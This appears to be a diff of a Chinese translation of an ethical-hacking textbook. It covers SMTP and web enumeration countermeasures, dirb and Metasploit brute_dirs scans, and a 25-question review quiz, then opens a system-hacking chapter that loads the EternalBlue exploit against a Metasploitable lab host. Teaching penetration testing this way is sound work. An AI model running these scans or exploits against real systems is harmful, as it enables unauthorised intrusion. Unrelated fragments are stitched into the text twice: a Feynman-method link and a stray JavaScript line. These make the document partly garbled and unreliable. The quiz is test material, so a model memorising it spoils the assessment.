+* **禁用 `VRFY`** 一些 SMTP 服务器允许禁用此命令。将其从你的邮件服务器中移除，通常不会影响邮件投递所需的任何功能。
+* **忽略未知地址** 让你的 SMTP 服务器忽略未知的用户名/电子邮件地址。返回错误会向攻击者提供用户是否存在的信息。
+* **限制 Header 中的信息** 确保你不会向攻击者泄露内部电子邮件链的信息。这会向攻击者透露内部系统以及环境中的其他 SMTP 服务器。
+* **禁用公开中继** 虽然这比以前少见，但确保你环境中的所有系统都不允许向其他域中继，有助于防止利用这些系统对其他域进行列举，因为许多终端用户网络（如有线网络）只允许发送给其提供商的电子邮件地址。
+* **实施邮件安全** 虽然这些做法可能不完全防止列举，但越来越多的企业实施诸如 Sender Policy Framework（SPF）和 DomainKeys Identified Mail（DKIM）等措施，能更好地限制谁可以发送邮件，从而也能限制对邮件服务器的探测。
 
 ### Web‑Based Enumeration（基于 Web 的枚举）
 
@@ -5780,91 +6549,85 @@ iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
 
 下面展示了程序 `dirb` 的使用示例，它自带常见目录名称的单词列表。该示例针对我自己网络中的一个 Web 服务器，该服务器上已解压 WordPress 分发包到基目录。
 
-**dirb 目录测试**
+#### `dirb` 目录测试
 
-```
- root@quiche:~# dirb http://192.168.86.52/
-  
- -----------------
- DIRB v2.22
- By The Dark Raver
- -----------------
-  
- START_TIME: Sun Dec 3 19:38:36 2022
- URL_BASE: http://192.168.86.52/
- WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
-  
- -----------------
-  
- GENERATED WORDS: 4612
-  
- ---- Scanning URL: http://192.168.86.52/ ----
- + http://192.168.86.52/index.php (CODE:200|SIZE:418)
- ==> DIRECTORY: http://192.168.86.52/wp-admin/
- ==> DIRECTORY: http://192.168.86.52/wp-content/
- ==> DIRECTORY: http://192.168.86.52/wp-includes/
- + http://192.168.86.52/xmlrpc.php (CODE:200|SIZE:3065)
-  
- ---- Entering directory: http://192.168.86.52/wp-admin/ ----
- + http://192.168.86.52/wp-admin/admin.php (CODE:200|SIZE:10531)
- ==> DIRECTORY: http://192.168.86.52/wp-admin/css/
- ==> DIRECTORY: http://192.168.86.52/wp-admin/images/
- ==> DIRECTORY: http://192.168.86.52/wp-admin/includes/
- + http://192.168.86.52/wp-admin/index.php (CODE:200|SIZE:7265)
- ==> DIRECTORY: http://192.168.86.52/wp-admin/js/
- ==> DIRECTORY: http://192.168.86.52/wp-admin/maint/
- ==> DIRECTORY: http://192.168.86.52/wp-admin/network/
- ==> DIRECTORY: http://192.168.86.52/wp-admin/user/
- 
+```text
+root@quiche:~# dirb http://192.168.86.52/
+
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+START_TIME: Sun Dec 3 19:38:36 2022
+URL_BASE: http://192.168.86.52/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+-----------------
+GENERATED WORDS: 4612
+
+---- Scanning URL: http://192.168.86.52/ ----
++ http://192.168.86.52/index.php (CODE:200|SIZE:418)
+==> DIRECTORY: http://192.168.86.52/wp-admin/
+==> DIRECTORY: http://192.168.86.52/wp-content/
+==> DIRECTORY: http://192.168.86.52/wp-includes/
++ http://192.168.86.52/xmlrpc.php (CODE:200|SIZE:3065)
+
+---- Entering directory: http://192.168.86.52/wp-admin/ ----
++ http://192.168.86.52/wp-admin/admin.php (CODE:200|SIZE:10531)
+==> DIRECTORY: http://192.168.86.52/wp-admin/css/
+==> DIRECTORY: http://192.168.86.52/wp-admin/images/
+==> DIRECTORY: http://192.168.86.52/wp-admin/includes/
++ http://192.168.86.52/wp-admin/index.php (CODE:200|SIZE:7265)
+==> DIRECTORY: http://192.168.86.52/wp-admin/js/
+==> DIRECTORY: http://192.168.86.52/wp-admin/maint/
+==> DIRECTORY: http://192.168.86.52/wp-admin/network/
+==> DIRECTORY: http://192.168.86.52/wp-admin/user/
 ```
 
 我们目前已经检查了已知或预期的目录。使用单词列表并不保证能够识别服务器上所有可用的目录。如果目录不在列表中，则不会被发现。此时可以转向另一个工具进行目录名模糊测试，即基于规则动态生成名称。你可能会在此阶段期待转向 Metasploit，因为它非常有用。我们可以使用 `brute_dirs` 模块。使用该模块时，你设置目录名称的格式，模块会遍历所有符合该格式的可能名称。下面展示了该模块的可用选项以及设定的格式，我们将测试所有由小写字符组成、长度在 1 到 8 个字符之间的词。
 
-**brute_dirs Metasploit 模块**
+#### `brute_dirs` Metasploit 模块
 
-```
- msf> use auxiliary/scanner/http/brute_dirs
- msf auxiliary(scanner/http/brute_dirs)> info
-  
-        Name: HTTP Directory Brute Force Scanner
-       Module: auxiliary/scanner/http/brute_dirs
-     License: BSD License
-        Rank: Normal
-  
- Provided by:
-   et <et@metasploit.com>
-  
- Basic options:
-   Name     Current Setting  Required  Description
-   ----     ---------------  --------  -----------
-   FORMAT   a,aa,aaa         yes       The expected directory   format (a alpha, d digit, A upperalpha)
-   PATH     /                yes       The path to identify directories
-   Proxies                   no        A proxy chain of format   type:host:port[,type:host:port][…]
-   RHOSTS   192.168.86.52    yes       The target address range   or CIDR identifier
-   RPORT    80               yes       The target port (TCP)
-   SSL      false            no        Negotiate SSL/TLS for   outgoing connections
-   THREADS  1                yes       The number of concurrent threads
-   VHOST                     no        HTTP server virtual host
-  
- Description:
-   This module identifies the existence of interesting directories by
-   brute forcing the name in a given directory path.
-  
- msf auxiliary(scanner/http/brute_dirs)> set FORMAT a,aa,aaa,aaaa,aaaaa,aaaaaa,
- aaaaaaa,aaaaaaaa
- FORMAT => a,aa,aaa,aaaa,aaaaa,aaaaaa,aaaaaaa,aaaaaaaa
- msf auxiliary(scanner/http/brute_dirs)> run
-  
- [*] Using code '404' as not found.
- 
+```text
+msf> use auxiliary/scanner/http/brute_dirs
+msf auxiliary(scanner/http/brute_dirs)> info
+       Name: HTTP Directory Brute Force Scanner
+      Module: auxiliary/scanner/http/brute_dirs
 ```
 
-Metasploit 当然拥有大量模块，可用于 Web‑based  enumeration 除了识别 Web 服务器上的目录之外。当你开始使用网站和特别是 Web 应用时，你会发现许多广为人知的开源应用。例如，你可能会发现一个 WordPress 安装。同样使用 Metasploit，我们可以枚举 WordPress 安装中的用户。`wordpress_login_enum` 模块可以接受用户文件或密码文件，也可以提供单个用户名配合密码文件，或单个密码配合用户名文件。该模块还有许多其他可设置的选项，提供了丰富的功能。下面展示了在本地 WordPress 安装上运行该模块的示例。
+
+
+- License: BSD License
+- Rank: Normal
+- Provided by: et <et@metasploit.com>
+
+**Basic options:**
+
+| Name | Current Setting | Required | Description |
+|------|-----------------|----------|-------------|
+| `FORMAT` | a,aa,aaa | yes | The expected directory format (a alpha, d digit, A upperalpha) |
+| `PATH` | `/` | yes | The path to identify directories |
+| `Proxies` |  | no | A proxy chain of format type:host:port[,type:host:port][…] |
+| `RHOSTS` | 192.168.86.52 | yes | The target address range or CIDR identifier |
+| `RPORT` | 80 | yes | The target port (TCP) |
+| `SSL` | false | no | Negotiate SSL/TLS for outgoing connections |
+| `THREADS` | 1 | yes | The number of concurrent threads |
+| `VHOST` |  | no | HTTP server virtual host |
+
+**Description:**
+
+This module identifies the existence of interesting directories by brute forcing the name in a given directory path.
+
+```
+msf auxiliary(scanner/http/brute_dirs)> set FORMAT a,aa,aaa,aaaa,aaaaa,aaaaaa,
+aaaaaaa,aaaaaaaa
+FORMAT => a,aa,aaa,aaaa,aaaaa,aaaaaa,aaaaaaa,aaaaaaaa
+msf auxiliary(scanner/http/brute_dirs)> run
+[*] Using code '404' as not found.
+```
+
+Metasploit 当然拥有大量模块，可用于 Web-based enumeration 除了识别 Web 服务器上的目录之外。当你开始使用网站和特别是 Web 应用时，你会发现许多广为人知的开源应用。例如，你可能会发现一个 WordPress 安装。同样使用 Metasploit，我们可以枚举 WordPress 安装中的用户。`wordpress_login_enum` 模块可以接受用户文件或密码文件，也可以提供单个用户名配合密码文件，或单个密码配合用户名文件。该模块还有许多其他可设置的选项，提供了丰富的功能。下面展示了在本地 WordPress 安装上运行该模块的示例。
 
 **枚举 WordPress 用户名**
-
-
-
 
 -   [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**Richard Feynman**。
 
@@ -5878,15 +6641,13 @@ if (condVar > someVal) {console.log("xxx")}
 
 这些并不是我们在 Web 应用中能够列举的唯一事项。我们可以扫描网络以查找不同的 Web 应用，或者查看用户列举。查找 Web 服务器上的目录也是有用的，因为它可以帮助我们识别应用以及可能可用的数据。
 
-### Countermeasures
+## Countermeasures
 
 从 Web 服务器中可以泄露大量信息。有一些技术可以用于防止基于 Web 的列举。
 
-*   **限制所提供的信息**   Headers 和错误消息不应泄露服务器信息，尤其是版本号，包括底层操作系统或应用程序栈的信息。
-
-*   **使用适当的访问控制**   确保所有 Web 应用都启用了强有力的身份验证，并设置了适当的访问控制，以保护资源免受未经授权的用户访问。
-
-*   **禁用目录列表**   禁用 Web 服务器的开放目录列表，以防止可能敏感的文件被公开访问。
+*   **限制所提供的信息**　　Headers 和错误消息不应泄露服务器信息，尤其是版本号，包括底层操作系统或应用程序栈的信息。
+*   **使用适当的访问控制**　　确保所有 Web 应用都启用了强有力的身份验证，并设置了适当的访问控制，以保护资源免受未经授权的用户访问。
+*   **禁用目录列表**　　禁用 Web 服务器的开放目录列表，以防止可能敏感的文件被公开访问。
 
 ## Summary
 
@@ -5908,190 +6669,157 @@ SMB 依赖于 RPC。NFS（由 Sun Microsystems 开发的文件共享协议）也
 
 答案位于附录。
 
-1.  RPCs 主要用于什么？  
-    1.  进程间通信  
-    2.  进程间信号量  
-    3.  远程方法调用  
-    4.  进程需求页存  
+1.  RPCs 主要用于什么？
+    - 1. 进程间通信
+    - 2. 进程间信号量
+    - 3. 远程方法调用
+    - 4. 进程需求页存
 
-2.  如果你使用 `enum4linux`，你试图枚举什么？  
-    1.  过程  
-    2.  基于 Linux 的服务  
-    3.  共享和/或用户  
-    4.  内存利用  
+2.  如果你使用 `enum4linux`，你试图枚举什么？
+    - 1. 过程
+    - 2. 基于 Linux 的服务
+    - 3. 共享和/或用户
+    - 4. 内存利用
 
-3.  你如何通过 SNMPv1 进行身份验证？  
-    1.  用户名/密码  
-    2.  哈希  
-    3.  公共字符串  
-    4.  社区字符串  
+3.  你如何通过 SNMPv1 进行身份验证？
+    - 1. 用户名/密码
+    - 2. 哈希
+    - 3. 公共字符串
+    - 4. 社区字符串
 
-4.  哪条 SMTP 命令用于获取邮件列表的用户列表？  
-    1.  `EXPD`  
-    2.  `VRFY`  
-    3.  `EXPN`  
-    4.  `VRML`  
+4.  哪条 SMTP 命令用于获取邮件列表的用户列表？
+    - 1. `EXPD`
+    - 2. `VRFY`
+    - 3. `EXPN`
+    - 4. `VRML`
 
-5.  你会使用工具 `dirb` 进行哪种枚举？  
-    1.  目录列表  
-    2.  目录枚举  
-    3.  暴力拨号  
-    4.  用户目录分析  
+5.  你会使用工具 `dirb` 进行哪种枚举？
+    - 1. 目录列表
+    - 2. 目录枚举
+    - 3. 暴力拨号
+    - 4. 用户目录分析
 
-6.  SNMP 中的数据描述被称为？  
-    1.  基于管理的信息  
-    2.  数据结构定义  
-    3.  可扩展标记语言  
-    4.  管理信息基  
+6.  SNMP 中的数据描述被称为？
+    - 1. 基于管理的信息
+    - 2. 数据结构定义
+    - 3. 可扩展标记语言
+    - 4. 管理信息基
 
-7.  如果 Java 程序通过网络共享过程，它们会向什么来标识自己？  
-    1.  RMI 注册表  
-    2.  RMI 映射器  
-    3.  RMI 数据库  
-    4.  RMI 进程  
+7.  如果 Java 程序通过网络共享过程，它们会向什么来标识自己？
+    - 1. RMI 注册表
+    - 2. RMI 映射器
+    - 3. RMI 数据库
+    - 4. RMI 进程
 
-8.  你在与同事合作时，看到他们使用 `VRFY` 命令与邮件服务器交互。你的同事在做什么？  
-    1.  验证 SMTP 命令  
-    2.  验证邮件列表  
-    3.  验证电子邮件地址  
-    4.  验证服务器配置  
+8.  你在与同事合作时，看到他们使用 `VRFY` 命令与邮件服务器交互。你的同事在做什么？
+    - 1. 验证 SMTP 命令
+    - 2. 验证邮件列表
+    - 3. 验证电子邮件地址
+    - 4. 验证服务器配置
 
-9.  SMB 协议用于什么？  
-    1.  使用 NFS 进行的数据传输  
-    2.  Windows 系统上的数据传输  
-    3.  电子邮件附件的数据传输  
-    4.  Windows 注册表更新的数据传输  
+9.  SMB 协议用于什么？
+    - 1. 使用 NFS 进行的数据传输
+    - 2. Windows 系统上的数据传输
+    - 3. 电子邮件附件的数据传输
+    - 4. Windows 注册表更新的数据传输
 
-10. 哪个是 Windows 内置程序，用于通过 SMB 收集信息？  
-     1.  `nmblookup`  
-     2.  `smbclient`  
-     3.  Metasploit  
-     4.  `nbtstat`  
+10. 哪个是 Windows 内置程序，用于通过 SMB 收集信息？
+    - 1. `nmblookup`
+    - 2. `smbclient`
+    - 3. Metasploit
+    - 4. `nbtstat`
 
-11. 如果你尝试使用 `VRFY` 命令失败，会得到什么状态码？  
-     1.  550  
-     2.  501  
-     3.  250  
-     4.  200  
+11. 如果你尝试使用 `VRFY` 命令失败，会得到什么状态码？
+    - 1. 550
+    - 2. 501
+    - 3. 250
+    - 4. 200
 
-12. 哪个程序用于枚举服务？  
-     1.  `smbclient`  
-     2.  `nmap`  
-     3.  `enum4linux`  
-     4.  `snmpwalk`  
+12. 哪个程序用于枚举服务？
+    - 1. `smbclient`
+    - 2. `nmap`
+    - 3. `enum4linux`
+    - 4. `snmpwalk`
 
-13. 哪个版本的 SNMP 引入了加密和基于用户的身份验证？  
-     1.  1  
-     2.  2  
-     3.  2c  
-     4.  3  
+13. 哪个版本的 SNMP 引入了加密和基于用户的身份验证？
+    - 1. 1
+    - 2. 2
+    - 3. 2c
+    - 4. 3
 
-14. 你可以在 WordPress 站点上使用 `wpscan` 枚举哪些内容？  
-     1.  插件  
-     2.  帖子  
-     3.  管理员  
-     4.  版本  
+14. 你可以在 WordPress 站点上使用 `wpscan` 枚举哪些内容？
+    - 1. 插件
+    - 2. 帖子
+    - 3. 管理员
+    - 4. 版本
 
-15. 哪个工具允许你基于识别出的开放端口创建自己的枚举函数？  
-     1.  Metasploit  
-     2.  `nmap`  
-     3.  Netcat  
-     4.  `nbtstat`  
+15. 哪个工具允许你基于识别出的开放端口创建自己的枚举函数？
+    - 1. Metasploit
+    - 2. `nmap`
+    - 3. Netcat
+    - 4. `nbtstat`
 
-16. 启用 Windows 文件共享的底层功能是什么？  
-     1.  网络文件系统  
-     2.  常见 Internet 文件系统  
-     3.  远程过程调用  
-     4.  远程方法调用  
+16. 启用 Windows 文件共享的底层功能是什么？
+    - 1. 网络文件系统
+    - 2. 常见 Internet 文件系统
+    - 3. 远程过程调用
+    - 4. 远程方法调用
 
-17. `IPC$` 共享用于什么？  
-     1.  进程管道  
-     2.  进程构建  
-     3.  远程进程管理  
-     4.  进程间通信  
+17. `IPC$` 共享用于什么？
+    - 1. 进程管道
+    - 2. 进程构建
+    - 3. 远程进程管理
+    - 4. 进程间通信
 
-18. Java 程序若要实现远程进程通信，需要使用什么工具？  
-     1.  JRE  
-     2.  `rmic`  
-
-
-
-
-3. `rmir`
-
-4. JDK
+18. Java 程序若要实现远程进程通信，需要使用什么工具？
+    - 1. JRE
+    - 2. `rmic`
+    - 3. `rmir`
+    - 4. JDK
 
 19. 哪个选项用于在系统之间传递对象？
-
-1. SunRPC
-
-2. SMB
-
-3. RMI
-
-4. `nmap`
+    - 1. SunRPC
+    - 2. SMB
+    - 3. RMI
+    - 4. `nmap`
 
 20. 如果你需要在多个服务之间枚举数据并将其存储以便以后检索，应该使用什么工具？
-
-1. Metasploit
-
-2. `nmap`
-
-3. RMI
-
-4. Postgres
+    - 1. Metasploit
+    - 2. `nmap`
+    - 3. RMI
+    - 4. Postgres
 
 21. 哪条 SMTP 命令最容易被禁用，以防止攻击者利用它进行枚举？
-
-1. `MAIL FROM`
-
-2. `RCPT TO`
-
-3. `DATA`
-
-4. `VRFY`
+    - 1. `MAIL FROM`
+    - 2. `RCPT TO`
+    - 3. `DATA`
+    - 4. `VRFY`
 
 22. 网络管理员应该运行哪个版本的 SNMP？
-
-1. V1
-
-2. V2
-
-3. V3
-
-4. V4
+    - 1. V1
+    - 2. V2
+    - 3. V3
+    - 4. V4
 
 23. 哪个选项不是保护 SMB 枚举的方法？
-
-1. 实施最新的 NetBIOS 补丁
-
-2. 禁用 SMB
-
-3. 使用网络防火墙
-
-4. 禁用共享
+    - 1. 实施最新的 NetBIOS 补丁
+    - 2. 禁用 SMB
+    - 3. 使用网络防火墙
+    - 4. 禁用共享
 
 24. 哪个 Metasploit 模块可以利用终端用户工作站可能存在的较弱权限？
-
-1. auxiliary/scanner/smb/smb_enumusers_domain
-
-2. auxiliary/admin/smb/delete_file
-
-3. auxiliary/admin/smb/check_dir_file
-
-4. auxiliary/scanner/smb/smb_enumshares
+    - 1. `auxiliary/scanner/smb/smb_enumusers_domain`
+    - 2. `auxiliary/admin/smb/delete_file`
+    - 3. `auxiliary/admin/smb/check_dir_file`
+    - 4. `auxiliary/scanner/smb/smb_enumshares`
 
 25. 哪种安全技术可以用于防止服务枚举？
+    - 1. 入侵检测系统 (IDS)
+    - 2. 主机防火墙
+    - 3. 终端检测与响应 (EDR)
+    - 4. 防病毒
 
-1. 入侵检测系统 (IDS)
-
-2. 主机防火墙
-
-3. 终端检测与响应 (EDR)
-
-4. 防病毒
-
-# Chapter 7  
+# Chapter 7
 
 System Hacking
 
@@ -6115,14 +6843,11 @@ System Hacking
 
 你可能在想，哪里可以找到大量的 exploit。一个很好的资源是 `www.exploit-db.com`。这是研究人员和开发者发布 exploit 代码和概念验证代码的站点，这些代码针对已识别的漏洞。虽然这些 exploit 往往会被纳入像 Metasploit 这样的工具中，但不一定总是如此。尤其是当 exploit 只是概念验证且并未完全实现时，它可能无法真正完成 exploit。如果你查看 Figure 7.1，可以看到当前 exploit 列表的代码清单。你看到的仅是远程 exploit 列表。公平地说，并非所有这些都符合你对 exploit 的想象——如果你把 exploit 想象为能直接给你一个 shell 的东西的话。
 
-![FIGURE 7.1 Remote Exploits list at www.exploit-db.com ¶ Source: Remote Exploits list / www.exploit-db.com / last accessed March 01, 2023.](img/c07f001.png)
+![FIGURE 7.1 Remote Exploits list at www.exploit-db.com Source: Remote Exploits list / www.exploit-db.com / last accessed March 01, 2023.](img/c07f001.png)
 
-**FIGURE 7.1** Remote Exploits list at `www.exploit-db.com` ¶ Source: Remote Exploits list / [www.exploit-db.com](http://www.exploit-db.com) / last accessed March 01, 2023.
+**FIGURE 7.1** Remote Exploits list at `www.exploit-db.com` Source: Remote Exploits list / [www.exploit-db.com](http://www.exploit-db.com) / last accessed March 01, 2023.
 
 你看到的只是一个 exploit 类别。你还会看到 web application exploit、denial‑of‑service exploit，以及本地 exploit（包括特权提升 exploit）。虽然远程 exploit 听起来更“性感”——毕竟谁不喜欢直接弹出一个 shell——但利用系统的方式远不止于此。事实上，往往有更容易的方法来渗透网络。撰写时，`www.exploit-db.com` 已经存档了近 45,000 条 exploit。
-
-
-
 
 -   [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**Richard Feynman**。
 
@@ -6134,191 +6859,257 @@ if (condVar > someVal) {console.log("xxx")}
 
 
 
--   [Tor 设计为匿名空间。这不仅包括访问网站的用户，也包括网站本身。要学习所有内容的位置会很费时。它也是非法商业的场所。你可能在 Tor 网络上发现一些漏洞，但更有可能的是，如果你发现了，它们会被出售而不是出于社区利益免费提供。]
 
--   [系统妥协]
+- Tor 设计为匿名空间。这不仅包括访问网站的用户，也包括网站本身。要学习所有内容的位置会很费时。它也是非法商业的场所。你可能在 Tor 网络上发现一些漏洞，但更有可能的是，如果你发现了，它们会被出售而不是出于社区利益免费提供。
 
--   [利用，或系统妥协，对我们有两个目的。其中之一是证明漏洞是真实存在的，而不仅仅是理论上的。毕竟，当我们进行漏洞扫描时，会得到系统可能存在漏洞的线索，但直到漏洞被利用后，才能确认该漏洞确实存在，这意味着我们不确定是否真的需要修复它。第二个原因是，利用漏洞并妥协系统可以让我们更深入组织内部，可能进一步暴露出其他漏洞。这部分原因是我们可能获得更深层的网络可达性，也可能能够窃取可以用于其他系统的凭证。]
+- 系统妥协
 
--   [我将介绍几种不同的系统妥协方法。我将从 Metasploit 开始，因为它是最常用的方法。需要注意的是，Metasploit 并不是唯一的 exploit 框架，还有其他商业软件可以完成相同的工作。Metasploit 也有商业版本，如果用于商业目的，应该购买商业许可证；此外还有一个社区版本。此外，你可以获取 Kali Linux，它默认已经预装了 Metasploit。其他软件包大致功能相同，你应该查看它们，看看在商业环境中更适合哪一个。]
+- 利用，或系统妥协，对我们有两个目的。其中之一是证明漏洞是真实存在的，而不仅仅是理论上的。毕竟，当我们进行漏洞扫描时，会得到系统可能存在漏洞的线索，但直到漏洞被利用后，才能确认该漏洞确实存在，这意味着我们不确定是否真的需要修复它。第二个原因是，利用漏洞并妥协系统可以让我们更深入组织内部，可能进一步暴露出其他漏洞。这部分原因是我们可能获得更深层的网络可达性，也可能能够窃取可以用于其他系统的凭证。
 
--   [我们也可以回到 Exploit Database 获取更多利用可能性。一旦你拥有漏洞列表，就可以在 exploit database 中搜索可用的实际 exploit。我将介绍如何识别模块并使用它们。在某些情况下，情况并不总是只需运行一个脚本。]
+- 我将介绍几种不同的系统妥协方法。我将从 `Metasploit` 开始，因为它是最常用的方法。需要注意的是，`Metasploit` 并不是唯一的 `exploit` 框架，还有其他商业软件可以完成相同的工作。`Metasploit` 也有商业版本，如果用于商业目的，应该购买商业许可证；此外还有一个社区版本。此外，你可以获取 `Kali Linux`，它默认已经预装了 `Metasploit`。其他软件包大致功能相同，你应该查看它们，看看在商业环境中更适合哪一个。
 
--   [### Metasploit 模块]
+- 我们也可以回到 `Exploit Database` 获取更多利用可能性。一旦你拥有漏洞列表，就可以在 `exploit database` 中搜索可用的实际 `exploit`。我将介绍如何识别模块并使用它们。在某些情况下，情况并不总是只需运行一个脚本。
 
--   [如果针对漏洞的已知 exploit 存在，它很可能已经进入了 Metasploit。这个项目最初是作为 exploit 框架开发的，目标是提供建块，使得通过组合编程模块可以快速构建 exploit。 additionally，shellcode 和 encoder 也可用于在开发 exploit 时嵌入。虽然它最初是面向发现漏洞的安全研究人员设计的，方便他们快速创建 exploit，但现在已成为渗透和安全测试人员的首选工具。其原因之一是可用的模块数量庞大，可在测试系统和网络时直接使用。]
+### Metasploit 模块
 
--   [几乎整个渗透测试的生命周期都可以在 Metasploit 内完成。截至本文写作时，已有超过 1,000 个 auxiliary 模块，其中许多是用于侦察和枚举的扫描器。通过这些模块，你可以了解网络的构造和提供的服务。你还可以导入 OpenVAS、Nessus 和 Nexpose（由与 Metasploit 同属一公司的公司开发）的漏洞扫描结果。获取这些信息后，下一步是进行利用。目前 Metasploit 已有超过 2,200 个 exploit 模块，虽然由于软件的流行度和 Rapid7 的持续开发，这个数字会不断变化。]
+如果针对漏洞的已知 `exploit` 存在，它很可能已经进入了 `Metasploit`。这个项目最初是作为 `exploit` 框架开发的，目标是提供建块，使得通过组合编程模块可以快速构建 `exploit`。additionally，`shellcode` 和 `encoder` 也可用于在开发 `exploit` 时嵌入。虽然它最初是面向发现漏洞的安全研究人员设计的，方便他们快速创建 `exploit`，但现在已成为渗透和安全测试人员的首选工具。其原因之一是可用的模块数量庞大，可在测试系统和网络时直接使用。
 
--   [Metasploit 让利用过程比手动编写 exploit 更加简便，前提是 Metasploit 已经提供相应的 exploit。如果没有，则你必须手动编写 exploit。我们将使用命令行进行操作，尽管 Rapid7 也提供了 Web 界面的包。CLI 会显示所有正在进行的操作。]
+几乎整个渗透测试的生命周期都可以在 `Metasploit` 内完成。截至本文写作时，已有超过 1,000 个 `auxiliary` 模块，其中许多是用于侦察和枚举的扫描器。通过这些模块，你可以了解网络的构造和提供的服务。你还可以导入 `OpenVAS`、`Nessus` 和 `Nexpose`（由与 `Metasploit` 同属一公司的公司开发）的漏洞扫描结果。获取这些信息后，下一步是进行利用。目前 `Metasploit` 已有超过 2,200 个 `exploit` 模块，虽然由于软件的流行度和 `Rapid7` 的持续开发，这个数字会不断变化。
 
--   [我们将从 `msfconsole` 程序开始。虽然有多种方式获取 Metasploit，但这里我使用的是 Kali Linux 实例，它默认已预装 Metasploit。只需设置用于存储主机、漏洞和获取的 loot 的数据库即可。下面的列表展示启动 `msfconsole` 的过程，这是与 Metasploit 交互的命令行程序。]
+`Metasploit` 让利用过程比手动编写 `exploit` 更加简便，前提是 `Metasploit` 已经提供相应的 `exploit`。如果没有，则你必须手动编写 `exploit`。我们将使用命令行进行操作，尽管 `Rapid7` 也提供了 Web 界面的包。`CLI` 会显示所有正在进行的操作。
+
+我们将从 `msfconsole` 程序开始。虽然有多种方式获取 `Metasploit`，但这里我使用的是 `Kali Linux` 实例，它默认已预装 `Metasploit`。只需设置用于存储主机、漏洞和获取的 `loot` 的数据库即可。下面的列表展示启动 `msfconsole` 的过程，这是与 `Metasploit` 交互的命令行程序。
 
 **Starting `msfconsole`**
 
 ```
 kilroy@quiche:~$ sudo msfconsole
-  
+
 _                                                    _
+
 / \    /\         __                         _   __  /_/ __
+
 | |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
+
 | | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
+
 |_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
+
        |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\
-  
-  
+
         =[ metasploit v6.2.29-dev                          ]
+
  + -- --=[ 2271 exploits - 1189 auxiliary - 404 post       ]
+
  + -- --=[ 951 payloads - 45 encoders - 11 nops            ]
+
  + -- --=[ 9 evasion                                       ]
-  
+
 Metasploit tip: View advanced module options with
+
 advanced
+
 Metasploit Documentation: https://docs.metasploit.com/
-  
+
 msf6>
 ```
 
--   [一旦 `msfconsole` 启动，我们需要查找针对已识别漏洞的 exploit。我将在家庭网络中使用一台 Windows Server，它是 Metasploitable 3 实例，内置了多个易受攻击的服务，非常适合演示和练习。查找 exploit 时，可以使用搜索功能。下面的列表展示了搜索 “eternalblue” 的结果，这是利用 CVE‑2017‑0144 漏洞的 exploit，即 EternalBlue SMB 漏洞。搜索结果包含多个匹配项，你可以通过指定类型（如 `type:exploit`）进一步缩小范围，以便更快定位合适的模块。]
+一旦 `msfconsole` 启动，我们需要查找针对已识别漏洞的 `exploit`。我将在家庭网络中使用一台 `Windows Server`，它是 `Metasploitable 3` 实例，内置了多个易受攻击的服务，非常适合演示和练习。查找 `exploit` 时，可以使用搜索功能。下面的列表展示了搜索 `eternalblue` 的结果，这是利用 `CVE‑2017‑0144` 漏洞的 `exploit`，即 `EternalBlue SMB` 漏洞。搜索结果包含多个匹配项，你可以通过指定类型（如 `type:exploit`）进一步缩小范围，以便更快定位合适的模块。
 
 ```
 msf6> search eternalblue
-  
+
 Matching Modules
+
 ==============
-  
+
     #  Name                                      Disclosure Date  Rank     Check  Description
+
     -  ----                                      ---------------  ----     -----  -----------
+
     0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+
     1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+
     2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+
     3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
+
     4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+
 Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce 
- 
 ```
 
+我们可以根据目标需求选择不同的模块。在此情境下，我想在远程系统上获取一个 `shell`；辅助模块会让我们在远程系统上执行单条命令，这与以 `psexec` 结尾的命令相同。因此，我们将使用以 `010_eternalblue` 结尾的 `exploit`，如下面的代码列表所示。这将在远程主机上提供一个 `shell`。从该 `shell` 中，我们可以发出命令，而不止于单个命令，其他模块只能做到的事。
 
-
--   我们可以根据目标需求选择不同的模块。在此情境下，我想在远程系统上获取一个 shell；辅助模块会让我们在远程系统上执行单条命令，这与以 `psexec` 结尾的命令相同。因此，我们将使用以 `010_eternalblue` 结尾的 exploit，如下面的代码列表所示。这将在远程主机上提供一个 shell。从该 shell 中，我们可以发出命令，而不止于单个命令，其他模块只能做到的事。
-
--   一旦我们确定使用的模块，就需要在 `msfconsole` 中使用 `use` 命令加载它。每个模块都有若干选项，这些选项可以或需要设置。在某些情况下，选项已经有默认值，无需额外操作。唯一始终需要设置的参数是目标的那个，它会是 `RHOST` 或 `RHOSTS`，取决于是否期望多个目标。例如，扫描模块会使用 `RHOSTS`，而 exploit 模块通常使用 `RHOST` 作为参数名。下面的代码列表中，我们需要设置 `RHOST` 为要尝试 exploit 的目标 IP 地址。如预期，exploit 成功，给我们提供了远程系统的访问权限。
+一旦我们确定使用的模块，就需要在 `msfconsole` 中使用 `use` 命令加载它。每个模块都有若干选项，这些选项可以或需要设置。在某些情况下，选项已经有默认值，无需额外操作。唯一始终需要设置的参数是目标的那个，它会是 `RHOST` 或 `RHOSTS`，取决于是否期望多个目标。例如，扫描模块会使用 `RHOSTS`，而 `exploit` 模块通常使用 `RHOST` 作为参数名。下面的代码列表中，我们需要设置 `RHOST` 为要尝试 `exploit` 的目标 IP 地址。如预期，`exploit` 成功，给我们提供了远程系统的访问权限。
 
 **Eternal Blue Exploit**
 
 ```
 Msf6> use exploit/windows/smb/ms17_010_eternalblue
+
